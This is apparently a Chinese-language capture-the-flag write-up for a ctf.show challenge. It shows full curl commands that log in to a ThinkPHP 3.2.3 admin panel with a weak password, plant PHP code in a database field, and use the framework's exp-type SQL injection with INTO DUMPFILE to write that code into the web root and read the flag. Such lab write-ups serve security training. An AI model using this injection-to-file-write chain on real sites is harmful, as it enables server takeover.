# ThinkPHP SQL注入写入文件Getshell

## 题目信息

- **框架**: ThinkPHP 3.2.3

## 解题步骤

### 1. 信息收集

访问题目URL，发现是一个游戏后台管理系统，使用ThinkPHP 3.2.3框架。

### 2. 弱密码爆破

尝试常见弱密码，成功使用 `admin/123456` 登录后台。

```bash
curl -sk "https://xxx.challenge.ctf.show/index.php/Home/Index/index" \
  -X POST -d "username=admin&password=123456"
```

### 3. 修改游戏名称为PHP代码

登录后访问游戏编辑页面，将游戏名称修改为PHP代码：

```bash
curl -sk "https://xxx.challenge.ctf.show/index.php/Home/Game/gameEdit/" \
  -X POST -d "id=1&name=<?php phpinfo();?>&game_info=test&game_feature=test"
```

### 4. SQL注入写文件

利用ThinkPHP 3.2.3的exp型SQL注入，通过`INTO DUMPFILE`将游戏内容写入Web目录：

```bash
curl -sk "https://xxx.challenge.ctf.show/index.php/Home/Game/gameinfo/gameId/?gameId[0]=exp&gameId[1]==1%20into%20dumpfile%20%22/var/www/html/3.php%22"
```

### 5. 获取Flag

访问写入的文件，在环境变量中即可看到Flag：

```bash
curl -sk "https://xxx.challenge.ctf.show/3.php"
```

在phpinfo输出的Environment部分找到：
```
FLAG = ctfshow{11a92a09-86cc-4ef4-bcd2-0fa6b1a5319e}
```

## 漏洞原理

ThinkPHP 3.2.3版本存在SQL注入漏洞，当使用exp表达式查询时，过滤不严格导致可以利用`INTO DUMPFILE`将查询结果写入服务器文件，从而实现Getshell。